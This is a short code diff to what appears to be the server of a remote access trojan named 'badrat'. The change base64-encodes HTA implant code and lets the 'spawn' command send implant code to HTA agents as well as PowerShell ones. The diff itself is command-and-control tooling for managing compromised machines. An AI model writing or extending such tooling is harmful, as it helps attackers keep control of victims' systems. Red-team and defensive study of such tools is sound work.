@@ -124,11 +124,8 @@ def send_ratcode(ratID):
     print("\n[*] sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
     with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
         ratcode = fd.read()
-        if(types[ratID] == "hta"):
-            return(ratcode)
-        else:
-            ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
-            return(ratcode)
+        ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
+        return(ratcode)
 
 def encode_file(filepath):
     with open(Path(filepath).resolve() , "rb") as fd:
@@ -437,7 +434,7 @@ if __name__ == "__main__":
                         inp = "quit"
 
                     elif(inp == "spawn"):
-                        if(types[ratID] == "ps1"):
+                        if(types[ratID] == "ps1" or types[ratID] == "hta"):
                             inp = "spawn " + send_ratcode(ratID)
 
                     elif(str.startswith(inp, "psh ")):
